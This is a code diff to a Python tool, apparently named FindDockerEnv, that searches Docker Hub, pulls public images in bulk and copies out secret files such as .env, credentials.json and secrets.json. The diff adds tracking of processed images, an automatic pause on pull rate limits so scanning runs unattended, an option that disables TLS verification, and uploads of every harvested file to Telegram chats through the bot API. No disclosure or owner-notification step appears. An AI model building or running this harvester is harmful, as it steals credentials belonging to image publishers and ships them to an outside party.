@@ -1,9 +1,11 @@
 import argparse
 import csv
 import json
+import mimetypes
 import re
 import shutil
 import ssl
+import sqlite3
 import subprocess
 import sys
 import tempfile
@@ -12,16 +14,24 @@ import time
 import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass
+from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any
 from urllib import parse, request
 from urllib.error import HTTPError, URLError
+
+try:
+    from dotenv import load_dotenv
+except ImportError:
+    def load_dotenv() -> bool:
+        return False
 
 
 DOCKER_HUB_SEARCH_URL = "https://hub.docker.com/v2/search/repositories/"
 DOCKER_HUB_TAGS_URL = "https://hub.docker.com/v2/namespaces/{namespace}/repositories/{name}/tags"
 _IMAGE_USAGE_LOCK = threading.Lock()
 _IMAGE_USAGE_COUNTS: dict[str, int] = {}
+_DB_LOCK = threading.Lock()
 SENSITIVE_FILE_NAMES = {
     "config.json",
     "settings.py",
@@ -31,6 +41,15 @@ SENSITIVE_FILE_NAMES = {
     "secrets.json",
     "credentials.json",
 }
+
+
+@dataclass(slots=True)
+class AppConfig:
+    db_path: Path
+    rate_limit_wait_hours: float
+    telegram_bot_token: str | None
+    telegram_admin_ids: list[str]
+    insecure_network: bool = False
 
 
 @dataclass(slots=True)
@@ -59,6 +78,27 @@ class ScanResult:
     matched_files: list[Path] | None = None
     saved_files: list[Path] | None = None
     error: str | None = None
+
+
+def load_config() -> AppConfig:
+    load_dotenv()
+
+    db_path = Path(parse_env_value("DB_PATH", "state.db"))
+    rate_limit_wait_hours = float(parse_env_value("RATE_LIMIT_WAIT_HOURS", "6"))
+    telegram_bot_token = parse_env_value("TELEGRAM_BOT_TOKEN", "").strip() or None
+    admin_ids_raw = parse_env_value("TELEGRAM_ADMIN_IDS", "")
+    telegram_admin_ids = [item.strip() for item in admin_ids_raw.split(",") if item.strip()]
+
+    return AppConfig(
+        db_path=db_path,
+        rate_limit_wait_hours=rate_limit_wait_hours,
+        telegram_bot_token=telegram_bot_token,
+        telegram_admin_ids=telegram_admin_ids,
+    )
+
+
+def parse_env_value(name: str, default: str) -> str:
+    return str(__import__("os").environ.get(name, default))
 
 
 def extract_image_parts(item: dict[str, Any]) -> tuple[str | None, str | None]:
@@ -297,6 +337,68 @@ def run_command(args: list[str], check: bool = True) -> subprocess.CompletedProc
     )
 
 
+def init_db(config: AppConfig) -> None:
+    config.db_path.parent.mkdir(parents=True, exist_ok=True)
+    with sqlite3.connect(config.db_path) as conn:
+        conn.execute(
+            """
+            CREATE TABLE IF NOT EXISTS processed_images (
+                image TEXT PRIMARY KEY,
+                processed_at TEXT NOT NULL,
+                found_sensitive_files INTEGER NOT NULL DEFAULT 0
+            )
+            """
+        )
+        columns = {
+            row[1]
+            for row in conn.execute("PRAGMA table_info(processed_images)")
+        }
+        if "found_sensitive_files" not in columns:
+            conn.execute(
+                "ALTER TABLE processed_images ADD COLUMN found_sensitive_files INTEGER NOT NULL DEFAULT 0"
+            )
+        conn.commit()
+
+
+def is_image_processed(config: AppConfig, image: str) -> bool:
+    init_db(config)
+    with sqlite3.connect(config.db_path) as conn:
+        row = conn.execute("SELECT 1 FROM processed_images WHERE image = ? LIMIT 1", (image,)).fetchone()
+    return row is not None
+
+
+def mark_image_processed(config: AppConfig, image: str, found_sensitive_files: bool = False) -> None:
+    init_db(config)
+    processed_at = datetime.now(timezone.utc).isoformat()
+    with _DB_LOCK:
+        with sqlite3.connect(config.db_path) as conn:
+            conn.execute(
+                """
+                INSERT INTO processed_images (image, processed_at, found_sensitive_files)
+                VALUES (?, ?, ?)
+                ON CONFLICT(image) DO UPDATE SET
+                    processed_at = excluded.processed_at,
+                    found_sensitive_files = excluded.found_sensitive_files
+                """,
+                (image, processed_at, int(found_sensitive_files)),
+            )
+            conn.commit()
+
+
+def filter_unprocessed_candidates(config: AppConfig, candidates: list[RepositoryCandidate]) -> list[RepositoryCandidate]:
+    filtered: list[RepositoryCandidate] = []
+    for candidate in candidates:
+        if is_image_processed(config, candidate.image):
+            print(f"Skipping already processed image: {candidate.image}", file=sys.stderr)
+            continue
+        filtered.append(candidate)
+    return filtered
+
+
+def should_mark_processed(result: ScanResult) -> bool:
+    return result.status not in {"tag_resolve_failed", "pull_failed", "unsupported_manifest"}
+
+
 def ensure_docker_available() -> None:
     docker_path = shutil.which("docker")
     if not docker_path:
@@ -381,17 +483,190 @@ def classify_pull_error(error: str) -> str:
     return "pull_failed"
 
 
-def choose_pullable_image_reference(candidate: RepositoryCandidate, insecure: bool = False) -> tuple[str | None, str | None, str | None]:
+def is_rate_limit_error(error: str) -> bool:
+    normalized = error.lower()
+    return "unauthenticated pull rate limit" in normalized or "increase-rate-limit" in normalized
+
+
+def format_wait_duration(hours: float) -> str:
+    total_minutes = max(int(hours * 60), 1)
+    wait_hours, wait_minutes = divmod(total_minutes, 60)
+    if wait_hours and wait_minutes:
+        return f"{wait_hours}h {wait_minutes}m"
+    if wait_hours:
+        return f"{wait_hours}h"
+    return f"{wait_minutes}m"
+
+
+def send_telegram_form_request(
+    config: AppConfig,
+    method: str,
+    fields: dict[str, str],
+) -> tuple[bool, str | None]:
+    api_url = f"https://api.telegram.org/bot{config.telegram_bot_token}/{method}"
+    payload = parse.urlencode(fields).encode()
+    req = request.Request(api_url, data=payload, method="POST")
+    context = ssl._create_unverified_context() if config.insecure_network else None
+    try:
+        with request.urlopen(req, timeout=20, context=context) as response:
+            body = response.read().decode("utf-8", errors="replace")
+        return True, body
+    except HTTPError as exc:
+        details = exc.read().decode("utf-8", errors="replace")
+        return False, f"HTTP {exc.code}: {details}"
+    except URLError as exc:
+        return False, str(exc)
+
+
+def build_multipart_body(
+    fields: dict[str, str],
+    files: list[tuple[str, Path, str | None]],
+) -> tuple[bytes, str]:
+    boundary = f"----FindDockerEnv{uuid.uuid4().hex}"
+    chunks: list[bytes] = []
+
+    for name, value in fields.items():
+        chunks.extend(
+            [
+                f"--{boundary}\r\n".encode(),
+                f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode(),
+                value.encode("utf-8"),
+                b"\r\n",
+            ]
+        )
+
+    for field_name, file_path, content_type in files:
+        guessed_type = content_type or mimetypes.guess_type(file_path.name)[0] or "application/octet-stream"
+        chunks.extend(
+            [
+                f"--{boundary}\r\n".encode(),
+                (
+                    f'Content-Disposition: form-data; name="{field_name}"; '
+                    f'filename="{file_path.name}"\r\n'
+                ).encode(),
+                f"Content-Type: {guessed_type}\r\n\r\n".encode(),
+                file_path.read_bytes(),
+                b"\r\n",
+            ]
+        )
+
+    chunks.append(f"--{boundary}--\r\n".encode())
+    return b"".join(chunks), boundary
+
+
+def send_telegram_multipart_request(
+    config: AppConfig,
+    method: str,
+    fields: dict[str, str],
+    files: list[tuple[str, Path, str | None]],
+) -> tuple[bool, str | None]:
+    api_url = f"https://api.telegram.org/bot{config.telegram_bot_token}/{method}"
+    body, boundary = build_multipart_body(fields, files)
+    req = request.Request(
+        api_url,
+        data=body,
+        method="POST",
+        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+    )
+    context = ssl._create_unverified_context() if config.insecure_network else None
+    try:
+        with request.urlopen(req, timeout=60, context=context) as response:
+            payload = response.read().decode("utf-8", errors="replace")
+        return True, payload
+    except HTTPError as exc:
+        details = exc.read().decode("utf-8", errors="replace")
+        return False, f"HTTP {exc.code}: {details}"
+    except URLError as exc:
+        return False, str(exc)
+
+
+def send_telegram_message(config: AppConfig, text: str) -> None:
+    if not config.telegram_bot_token or not config.telegram_admin_ids:
+        return
+
+    for admin_id in config.telegram_admin_ids:
+        ok, error = send_telegram_form_request(
+            config,
+            "sendMessage",
+            {"chat_id": admin_id, "text": text},
+        )
+        if not ok and error:
+            print(f"Telegram sendMessage failed for chat {admin_id}: {error}", file=sys.stderr)
+
+
+def chunk_paths(paths: list[Path], chunk_size: int) -> list[list[Path]]:
+    return [paths[index:index + chunk_size] for index in range(0, len(paths), chunk_size)]
+
+
+def send_telegram_file_groups(config: AppConfig, image: str, saved_files: list[Path]) -> None:
+    if not config.telegram_bot_token or not config.telegram_admin_ids or not saved_files:
+        return
+
+    caption_base = f"Image: {image}"
+    file_groups = chunk_paths(saved_files, 10)
+
+    for admin_id in config.telegram_admin_ids:
+        for group_index, group in enumerate(file_groups, start=1):
+            media: list[dict[str, str]] = []
+            multipart_files: list[tuple[str, Path, str | None]] = []
+
+            for file_index, file_path in enumerate(group):
+                attachment_name = f"file{file_index}"
+                media_item: dict[str, str] = {
+                    "type": "document",
+                    "media": f"attach://{attachment_name}",
+                }
+                if file_index == 0:
+                    if len(file_groups) == 1:
+                        media_item["caption"] = caption_base
+                    else:
+                        media_item["caption"] = f"{caption_base} (group {group_index}/{len(file_groups)})"
+                media.append(media_item)
+                multipart_files.append((attachment_name, file_path, None))
+
+            ok, error = send_telegram_multipart_request(
+                config,
+                "sendMediaGroup",
+                {
+                    "chat_id": admin_id,
+                    "media": json.dumps(media, ensure_ascii=False),
+                },
+                multipart_files,
+            )
+            if not ok and error:
+                print(f"Telegram sendMediaGroup failed for chat {admin_id}: {error}", file=sys.stderr)
+
+
+def pause_on_rate_limit(config: AppConfig, image_reference: str) -> None:
+    wait_text = format_wait_duration(config.rate_limit_wait_hours)
+    message = f"Pull rate limit reached for {image_reference}. Application paused for {wait_text}."
+    print(message, file=sys.stderr)
+    send_telegram_message(config, message)
+    time.sleep(max(config.rate_limit_wait_hours, 0) * 3600)
+
+
+def choose_pullable_image_reference(
+    candidate: RepositoryCandidate,
+    config: AppConfig,
+    insecure: bool = False,
+) -> tuple[str | None, str | None, str | None]:
     last_error: str | None = None
     last_status: str | None = None
 
     for image_reference in get_image_references(candidate, insecure=insecure):
-        pull_result = run_command(["docker", "pull", image_reference], check=False)
-        if pull_result.returncode == 0:
-            return image_reference, None, None
+        while True:
+            pull_result = run_command(["docker", "pull", image_reference], check=False)
+            error_text = pull_result.stderr.strip() or pull_result.stdout.strip() or "docker pull failed"
+            if pull_result.returncode == 0:
+                return image_reference, None, None
 
-        last_error = pull_result.stderr.strip() or pull_result.stdout.strip() or "docker pull failed"
-        last_status = classify_pull_error(last_error)
+            if is_rate_limit_error(error_text):
+                pause_on_rate_limit(config, image_reference)
+                continue
+
+            last_error = error_text
+            last_status = classify_pull_error(last_error)
+            break
 
     return None, last_status or "pull_failed", last_error or "docker pull failed"
 
@@ -405,19 +680,25 @@ def copy_found_env(env_path: Path, result_dir: Path, image: str) -> Path:
     return destination
 
 
+def build_flat_destination(image_dir: Path, original_name: str, sequence_number: int) -> Path:
+    if sequence_number == 1:
+        return image_dir / original_name
+
+    source = Path(original_name)
+    return image_dir / f"{source.stem}_{sequence_number}{source.suffix}"
+
+
 def copy_found_files(found_paths: list[Path], root_dir: Path, result_dir: Path, image: str) -> list[Path]:
     result_dir.mkdir(parents=True, exist_ok=True)
     image_dir = result_dir / make_safe_image_name(image)
     image_dir.mkdir(parents=True, exist_ok=True)
     saved_paths: list[Path] = []
+    used_names: dict[str, int] = {}
 
     for path in found_paths:
-        try:
-            relative_path = path.relative_to(root_dir)
-        except ValueError:
-            relative_path = Path(path.name)
-        destination = image_dir / relative_path
-        destination.parent.mkdir(parents=True, exist_ok=True)
+        base_name = path.name
+        used_names[base_name] = used_names.get(base_name, 0) + 1
+        destination = build_flat_destination(image_dir, base_name, used_names[base_name])
         shutil.copy2(path, destination)
         saved_paths.append(destination)
 
@@ -429,6 +710,7 @@ def scan_repository(
     start_timeout: float,
     keep_temp: bool,
     result_dir: Path,
+    config: AppConfig,
     insecure: bool,
 ) -> ScanResult:
     container_name = f"find-docker-env-{uuid.uuid4().hex[:12]}"
@@ -438,7 +720,11 @@ def scan_repository(
 
     try:
         try:
-            resolved_image, pull_status, pull_error = choose_pullable_image_reference(candidate, insecure=insecure)
+            resolved_image, pull_status, pull_error = choose_pullable_image_reference(
+                candidate,
+                config=config,
+                insecure=insecure,
+            )
         except (HTTPError, URLError, TimeoutError, RuntimeError) as exc:
             return ScanResult(
                 image=candidate.image,
@@ -504,6 +790,12 @@ def scan_repository(
             else []
         )
         env_saved_to = saved_files[0] if saved_files else None
+        if saved_files:
+            send_telegram_message(
+                config,
+                f"Sensitive files found in {resolved_image}: {', '.join(path.name for path in saved_files)}",
+            )
+            send_telegram_file_groups(config, resolved_image, saved_files)
 
         return ScanResult(
             image=resolved_image,
@@ -610,6 +902,7 @@ def scan_repositories(
     keep_temp: bool,
     workers: int,
     result_dir: Path,
+    config: AppConfig,
     insecure: bool,
 ) -> list[ScanResult]:
     total = len(candidates)
@@ -621,16 +914,20 @@ def scan_repositories(
                 start_timeout=start_timeout,
                 keep_temp=keep_temp,
                 result_dir=result_dir,
+                config=config,
                 insecure=insecure,
             )
             results.append(result)
+            if should_mark_processed(result):
+                mark_image_processed(config, item.image, found_sensitive_files=result.env_found)
             print(f"Processed {index}/{total}: {result.image} [{result.status}]", file=sys.stderr)
         return results
 
     results_by_index: dict[int, ScanResult] = {}
+    candidate_by_index = {index: candidate for index, candidate in enumerate(candidates)}
     with ThreadPoolExecutor(max_workers=workers) as executor:
         future_map = {
-            executor.submit(scan_repository, candidate, start_timeout, keep_temp, result_dir, insecure): index
+            executor.submit(scan_repository, candidate, start_timeout, keep_temp, result_dir, config, insecure): index
             for index, candidate in enumerate(candidates)
         }
         processed = 0
@@ -638,6 +935,12 @@ def scan_repositories(
             result_index = future_map[future]
             result = future.result()
             results_by_index[result_index] = result
+            if should_mark_processed(result):
+                mark_image_processed(
+                    config,
+                    candidate_by_index[result_index].image,
+                    found_sensitive_files=result.env_found,
+                )
             processed += 1
             print(f"Processed {processed}/{total}: {result.image} [{result.status}]", file=sys.stderr)
 
@@ -646,9 +949,12 @@ def scan_repositories(
 
 def main() -> int:
     args = parse_args()
+    config = load_config()
+    config.insecure_network = args.insecure
 
     try:
         ensure_docker_available()
+        init_db(config)
         start_page = calculate_start_page(args.start_from_index, args.page_size)
         page_offset = calculate_page_offset(args.start_from_index, args.page_size)
         candidates = search_repositories(
@@ -665,6 +971,7 @@ def main() -> int:
             start_from_index=page_offset + 1,
             start_from_image=args.start_from_image,
         )
+        candidates = filter_unprocessed_candidates(config, candidates)
     except ssl.SSLCertVerificationError as exc:
         print(
             "TLS certificate verification failed while talking to Docker Hub. "
@@ -698,7 +1005,13 @@ def main() -> int:
         keep_temp=args.keep_temp,
         workers=max(args.workers, 1),
         result_dir=Path(args.result_dir),
+        config=config,
         insecure=args.insecure,
+    )
+
+    send_telegram_message(
+        config,
+        f"FindDockerEnv finished. Processed {len(results)} images, found matches in {sum(1 for item in results if item.env_found)} images.",
     )
 
     if args.report_file:
